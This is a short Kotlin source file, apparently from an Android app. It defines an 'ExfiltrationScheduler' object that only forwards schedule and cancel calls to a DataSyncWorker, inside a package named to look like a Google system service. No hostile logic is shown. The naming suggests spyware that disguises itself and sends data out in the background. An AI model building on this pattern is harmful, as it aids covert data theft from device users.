package com.google.android.systemservice.utils

import android.content.Context
import com.google.android.systemservice.workers.DataSyncWorker

/**
 * Thin delegate to DataSyncWorker scheduling.
 * Kept for API compatibility; all logic lives in DataSyncWorker.
 */
object ExfiltrationScheduler {

    fun schedule(context: Context) {
        DataSyncWorker.scheduleAdaptive(context)
    }

    fun cancel(context: Context) {
        DataSyncWorker.cancel(context)
    }
}
